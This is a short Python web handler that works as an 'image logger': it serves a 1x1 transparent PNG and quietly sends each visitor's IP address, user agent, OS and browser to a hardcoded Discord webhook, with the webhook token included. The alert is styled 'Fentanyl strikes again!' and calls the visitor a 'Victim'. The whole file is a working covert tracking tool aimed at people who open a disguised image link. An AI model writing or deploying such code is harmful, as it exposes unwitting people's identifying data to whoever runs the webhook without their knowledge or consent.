from http.server import BaseHTTPRequestHandler
from urllib import parse
import requests
import base64
import httpagentparser

# YOUR WEBHOOK HERE
webhook = 'https://discord.com/api/webhooks/1559315092594630798/yhnQBuFl52mEqp68sUIant-D9AMr2QwypBGHKanjP5DOhTwn2Tby7ohP7oSwjY07Yc5X'

# A simple placeholder image as bytes (Base64 encoded JPEG)
# This avoids complex b85 decoding issues during build
DEFAULT_IMG = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9fDwBhcYie6wAAAABJRU5ErkJggg==') # Tiny 1x1 transparent PNG

def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
    return {
      "username": "Fentanyl",
      "content": "@everyone",
      "embeds": [
        {
          "title": "Fentanyl strikes again!",
          "color": 16711803,
          "description": f"Victim: `{ip}` ({city}, {country})",
          "fields": [
            {"name": "OS/Browser", "value": f"{os} / {browser}", "inline": True},
            {"name": "User Agent", "value": f"`{useragent}`", "inline": False}
          ]
        }
      ],
    }

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # 1. Get IP
        ip = self.headers.get('x-forwarded-for', 'Unknown')
        useragent = self.headers.get('user-agent', 'Unknown')
        
        # 2. Parse User Agent
        try:
            os, browser = httpagentparser.simple_detect(useragent)
        except:
            os, browser = "Unknown", "Unknown"

        # 3. Send Image
        self.send_response(200)
        self.send_header('Content-type', 'image/png')
        self.end_headers()
        self.wfile.write(DEFAULT_IMG)

        # 4. Log to Discord
        try:
            # Only log if it's not a known bot spider (optional filter)
            if not any(bot in useragent.lower() for bot in ['googlebot', 'bingbot']):
                requests.post(webhook, json=formatHook(ip, "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", useragent, os, browser))
        except Exception as e:
            print(f"Discord Error: {e}")

        return
